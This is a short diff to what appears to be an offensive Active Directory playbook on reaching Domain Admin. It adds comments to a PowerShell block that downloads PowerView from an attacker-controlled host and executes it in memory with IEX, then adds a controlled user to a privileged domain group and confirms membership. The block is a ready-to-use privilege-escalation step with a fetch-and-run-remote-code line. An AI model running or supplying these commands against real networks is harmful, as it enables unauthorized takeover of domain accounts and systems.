@@ -32,7 +32,10 @@ Abuse BloodHound paths, AD CS, delegation, or misconfigurations to reach Domain 
 Load PowerView, inspect privileged groups, add a user to the target group, and confirm membership.
 
 ```powershell
+# Load PowerView in memory.
 (New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1') | IEX
+
+# Inspect the group, add the controlled user, and verify membership.
 Get-DomainGroup "<GROUP>"
 Add-DomainGroupMember -Identity "<GROUP>" -Members <USER>
 Get-DomainGroupMember "<GROUP>"
